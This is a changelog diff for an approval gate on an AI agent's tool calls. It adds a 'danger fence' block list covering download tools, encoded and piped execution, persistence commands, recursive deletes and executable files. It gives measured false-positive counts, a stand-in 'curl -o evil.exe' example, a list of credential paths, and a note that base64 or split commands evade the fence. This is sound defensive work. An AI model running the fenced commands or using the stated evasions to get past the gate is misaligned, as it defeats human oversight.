@@ -4,6 +4,59 @@ This file records notable changes to dsh-approval-gate. Version numbers follow [
 
 > Chinese version: see [CHANGELOG.md](CHANGELOG.md).
 
+## [0.9.7] — 2026-10-04
+
+**Allow by scope inside the workspace, with a veto layer for downloads and executable artefacts.** User decision: create/read/update/delete inside the workspace carries controllable risk and does not need a human every time, but when the model is induced to download a malicious script or an `.exe`, approval must fire.
+
+Those two requirements conflict by construction — `curl -o evil.exe http://x/y` has targets **entirely inside the workspace**, so a pure scope rule would wave it through. The fence therefore has to be a **veto layer on top of scope-allow**, ordered *before* the allowlist and learning: otherwise a single `contains` rule sedimented by one re-approval would permanently unblock downloads.
+
+### New: danger fence (deterministic, escalates to a human, never learns, never re-approvable)
+
+| Category | Trigger | Exemption |
+|---|---|---|
+| Network fetch | `curl` / `wget` / `aria2c` / `bitsadmin` / `Invoke-WebRequest`\|`iwr` / `Invoke-RestMethod`\|`irm` / `Start-BitsTransfer` / `certutil -urlcache` / `DownloadString`\|`DownloadFile`\|`DownloadData` / `gh release download` | when **every** URL in the command points at localhost (`http://127.0.0.1:1933/health` is a health check, not a fetch) |
+| Dynamic execution | `Invoke-Expression` / `iex` / `-EncodedCommand` / `FromBase64String` / `certutil -decode` / `\| bash`\|`sh`\|`pwsh`\|`powershell`\|`cmd`\|`iex` | — |
+| Package install | `npm`\|`pnpm`\|`yarn`\|`bun` `i`\|`install`\|`add`\|`dlx`\|`exec` / `pip install` / `cargo`\|`go`\|`winget`\|`choco`\|`scoop install` / `docker pull` | when the command targets `$DSH_HOME` (the profile/plugin-dependency tier that is already auto-allowed) |
+| Persistence | `schtasks` / `reg add` / `New-Service` / `sc create` / `core.hooksPath` / `Set-ExecutionPolicy` / `netsh advfirewall` / `Add-MpPreference` / `bcdedit` / `wmic` / `takeown` / `icacls` | — |
+| Recursive delete | `Remove-Item … -Recurse` / `rm -r…` / `rmdir /s` / `rmtree` / `git clean` / `git reset --hard` | **single-file cleanup is not fenced**: deleting `_commit-msg.txt` after a push is routine (36 times in 30 days), and fencing all of it would push human prompts from 147 to 180 |
+| Executable artefact | write-target extension `.exe .dll .msi .bat .cmd .ps1 .vbs .hta .lnk .reg .jar …`, or a target under `.git/hooks/`, `.github/workflows/`, `Startup/`, `sitecustomize.py` | `.sh`/`.py`/`.js` are excluded (a dev workspace produces them constantly); "download a `.sh`, then run it" is covered by the first two rows |
+
+**The matching rules are deliberately narrow, each because of a measured false positive:**
+
+- **Command tools only look at explicit write destinations** in the command (redirect / `-OutFile` / `-o` / `--output` / `-DestinationPath` / `Out-File` / `Set-Content` / `open(...,'w')`), not at the "write targets" `resolveToolCallFiles` reports — that heuristic is broad (a `*>` redirect counts as a write), so it flagged the `.ps1` **being executed** in `pwsh -File .\build.ps1 *> .\tmp\x.log` as a produced executable
+- **Persistence matches verbs, not path mentions**: `.github/workflows` inside a read command or a `git add` argument is not persistence (6 measured false positives)
+- `Start-Process` is not fenced (starting a local service is routine; 2 measured false positives)
+
+### New: scope auto-allow (switchable)
+
+- Position: after the allowlist, before the judge. `targetScope === 'inside'` with no fence hit ⇒ allowed directly, recorded as `verdict: 'scope'`, **zero judge calls**
+- The scope input now includes **resolved relative write targets**: `write`/`edit` usually pass `src/x.mjs`, and without resolution the scope would always be `unknown` (= never allowed), silently disabling the rule for the most common write path
+- **fail-closed is unchanged**: `unknown` (no absolute path extractable / contains a `..` traversal), `outside` and `mixed` are never allowed
+- New settings toggle "scope auto-allow: all targets inside the workspace → allow directly"; switching it off restores the old behaviour (in-workspace escalations go to the judge/human again)
+- The interception reason lands in the event (`facts.fenceText`) and in the Chinese card body (new `拦截：…` line); the facts table gains an "interception reason" row (warning colour) — without it the card only shows the model's own account
+
+### Measured (real `events.jsonl`, 30 days, 1204 events / 147 human prompts)
+
+- The fence fires **23 times**, 13 of which were previously auto-approved ⇒ about **0.4 extra human prompts per day**
+- Scope auto-allow saves **23 human prompts** (a further 4 in-workspace prompts are stopped by the fence)
+- Net effect: **10 fewer human prompts over 30 days** (−7%), while gaining the download/executable gate for the first time
+- Distribution of human prompts: `unknown` 83 / `outside` 35 / `inside` 27 / `mixed` 2 — only 18% are in-workspace, so scope auto-allow has a low ceiling (consistent with the 0.9.6 finding)
+- The largest fence contributor is **recursive delete (15)**, 4 of which are false positives from `rm -rf` inside a heredoc script body. Removing that one category recovers the full −23, at the cost of making in-workspace recursive deletes permanently automatic
+
+### Behaviour changes worth knowing
+
+- **The judge sees narrower traffic**: in-workspace calls no longer reach the judge layer. The old "in-workspace call → judge → allow" path is now handled by deterministic rules
+- Three existing test files (`pipeline` / `session-scope` / `path-targets`) explicitly set `scopeAutoAllow: false`: they test the judge pipeline and rule scoping, not scope auto-allow, which now has its own `test/fence-scope.test.mjs`
+- The redaction case in `pipeline.test.mjs` swaps `curl -H "Authorization: Bearer …"` for an ordinary command — the former now trips the network-fetch fence and never reaches the judge
+
+### Honest limits: what the fence does not stop
+
+The fence is **textual feature** matching and can be deliberately obfuscated around (base64, variable concatenation, a second-stage download, writing a script and running it later). It stops non-adversarial failures — a model being talked into a download — not a targeted attack. The real boundary remains the sandbox and the human.
+
+### Next (not implemented)
+
+④ Anchor git rules by command (drop `justification` from the match context) + always ask when out of workspace + always ask for sensitive path shapes (`.ssh` / `.aws` / `id_rsa` / `*.pem` / `.env` / `credential` / `token` / `Login Data` / `Cookies`); and retire the 5 broad seed rules (22 uses in 30 days).
+
 ## [0.9.6] — 2026-10-04
 
 **Approval records can finally answer "did this touch inside or outside the workspace?"**: deterministic absolute-path extraction and target localisation land, so command-flavoured tools (`pwsh` / `bash`) no longer lose their absolute paths, and relative fragments in the model's prose no longer masquerade as targets.
